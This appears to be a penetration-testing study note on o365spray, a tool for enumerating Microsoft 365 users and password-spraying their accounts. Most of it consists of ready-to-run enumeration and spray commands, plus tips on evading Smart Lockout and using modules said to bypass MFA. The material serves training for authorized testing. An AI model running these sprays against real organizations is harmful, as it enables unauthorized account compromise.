# o365spray

**Tags:** `#o365spray` `#microsoft365` `#userenumeration` `#passwordspray` `#cloud` `#auth` `#external`

Python tool for Microsoft 365 user enumeration and password spraying. Tests multiple
enumeration methods and spray vectors specific to M365/Entra ID authentication endpoints.
Purpose-built for external M365 engagements where Hydra/Medusa are too generic and
Kerbrute (AD Kerberos) doesn't apply.

**Source:** https://github.com/0xZDH/o365spray
**Install:**
```bash
git clone https://github.com/0xZDH/o365spray
pip install -r requirements.txt
```

> [!note] **o365spray vs Kerbrute** — Kerbrute attacks AD Kerberos pre-auth (requires network access to a DC). o365spray attacks Microsoft's online authentication endpoints — use it for external engagements targeting organizations using M365 without VPN/network access.

> [!note] **Flags use long form.** It's `--username`/`--userfile`, `--password`/`--passfile`, `--output` (no `-u`/`-U`/`-p`/`-P`/`-o` short flags), and the module is chosen with **`--enum-module`** or **`--spray-module`** (there is no single `--module`). The **default module is `oauth2`** for both modes.

---

## Validate Domain

First confirm the target domain uses Microsoft 365.

```bash
# Check if domain is on M365 (returns whether it's M365-hosted + auth type Managed/Federated)
python3 o365spray.py --validate --domain company.com
```

---

## User Enumeration

Identify valid accounts before spraying — avoids wasting spray attempts on non-existent users and reduces lockout risk.

```bash
# Enumerate from a username list (default enum module = oauth2)
python3 o365spray.py --enum --userfile usernames.txt --domain company.com

# Single user check
python3 o365spray.py --enum --username jsmith@company.com --domain company.com

# Pick the enumeration module explicitly
python3 o365spray.py --enum --userfile usernames.txt --domain company.com --enum-module office
python3 o365spray.py --enum --userfile usernames.txt --domain company.com --enum-module onedrive

# Save valid users to file
python3 o365spray.py --enum --userfile usernames.txt --domain company.com --output ./out/
```

---

## Password Spraying

```bash
# Spray a single password against a user list (default spray module = oauth2)
python3 o365spray.py --spray --userfile valid_users.txt --password 'Spring2024!' --domain company.com

# Single user
python3 o365spray.py --spray --username jsmith@company.com --password 'Spring2024!' --domain company.com

# Spray with a password list (careful — lockout risk; use --count/--lockout)
python3 o365spray.py --spray --userfile valid_users.txt --passfile passwords.txt --domain company.com

# Choose the spray module (activesync often bypasses MFA/CA; adfs for federated tenants)
python3 o365spray.py --spray --userfile users.txt --password 'Pass' --domain company.com --spray-module activesync
python3 o365spray.py --spray --userfile users.txt --password 'Pass' --domain company.com --spray-module adfs

# Save hits
python3 o365spray.py --spray --userfile users.txt --password 'Pass' --domain company.com --output ./out/
```

---

## Throttling & Smart-Lockout Safety

o365spray has **built-in** lockout-aware pacing — prefer these over hand-rolling rounds:

| Flag | Effect |
|---|---|
| `--count N` | Password attempts **per user** before pausing for the lockout window |
| `--lockout M` | Lockout-policy reset time in **minutes** to wait between bursts |
| `--sleep N` | Throttle: sleep N seconds between requests (`-1` = random 1–2 min) |
| `--jitter %` | Extend `--sleep` by a random percentage |
| `--rate N` | Concurrent connections (default 10) — lower it to stay quiet |

```bash
# One password per user, then wait 60 min before the next — automatically
python3 o365spray.py --spray --userfile valid_users.txt --passfile seasons.txt \
  --domain company.com --count 1 --lockout 60 --rate 3 --output ./out/
```

> [!warning] **Smart Lockout** — Entra ID Smart Lockout tracks failed attempts per account (default ~10 before a lockout window). Keep `--rate` low, use `--count 1 --lockout 60`, and spray one password per window. Smart Lockout also fires on the *familiar-location* logic, so bursts from one IP lock faster.

---

## Available Modules

Some endpoints only support one mode. `oauth2` is the default for both.

| Module | Enum | Spray | Notes |
|---|:---:|:---:|---|
| `oauth2` | ✅ (default) | ✅ (default) | Microsoft OAuth2 token endpoint |
| `office` | ✅ | — | Office endpoint — reliable enum |
| `onedrive` | ✅ | — | OneDrive endpoint enum |
| `autologon` | ✅ | ✅ | Autologon endpoint (both modes) |
| `rst` | ✅ | ✅ | Microsoft RST endpoint (both modes) |
| `activesync` | — | ✅ | Exchange ActiveSync — often bypasses MFA/CA |
| `autodiscover` | — | ✅ | Exchange Autodiscover spray |
| `reporting` | — | ✅ | Microsoft reporting endpoint spray |
| `adfs` | — | ✅ | ADFS endpoint for federated tenants |

---

## Safe Spray Workflow

```bash
# 1. Validate the domain is on M365 (and note Managed vs Federated)
python3 o365spray.py --validate --domain company.com

# 2. Generate username candidates with Username Anarchy
./username-anarchy -i names.txt -f first.last > candidates.txt

# 3. Enumerate valid users (no password attempts)
python3 o365spray.py --enum --userfile candidates.txt --domain company.com --output ./enum/

# 4. Spray one password per user with built-in lockout pacing
python3 o365spray.py --spray --userfile valid_users.txt --password 'Spring2024!' \
  --domain company.com --count 1 --lockout 60 --rate 3 --output ./spray/

# 5. Federated tenant? Try the adfs spray module (its lockout policy differs from AAD's)
python3 o365spray.py --spray --userfile valid_users.txt --password 'Summer2024!' \
  --domain company.com --spray-module adfs --count 1 --lockout 60 --output ./spray/
```

> [!note] **See also** — [[Class notes/HTB Academy/CPTS v2 (claude)/Attacking Common Services|Attacking Common Services]] (CPTS v2); [[Services/Email/SMTP|SMTP]] — user enumeration and password spraying against Office 365 / Exchange Online. Generate candidate usernames with [[Tools/Auth/Username Anarchy|Username Anarchy]].

---

*Created: 2026-03-06*
*Updated: 2026-09-28*
*Model: claude-opus-4-8*
